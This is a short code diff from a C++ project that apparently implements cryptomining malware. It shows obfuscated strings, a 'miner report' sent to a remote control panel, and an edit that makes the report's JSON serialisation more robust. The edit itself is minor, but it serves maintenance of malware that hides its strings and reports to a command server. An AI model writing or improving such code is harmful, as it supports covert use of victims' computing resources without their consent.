@@ -247,7 +247,12 @@ bool ConfigManager::FetchConfigFromPanel(const std::wstring& panelUrl,
             {OBFUSCATE_STRING("timestamp"),        std::time(nullptr)}
         };
 
-        std::string jsonPayload = minerReport.dump();
+        std::string jsonPayload = minerReport.dump(
+            -1,
+            ' ',
+            false,
+            json::error_handler_t::replace
+        );
         std::cout << "[*] Sending miner report to panel: " << jsonPayload << std::endl;
 
         // Post to panel
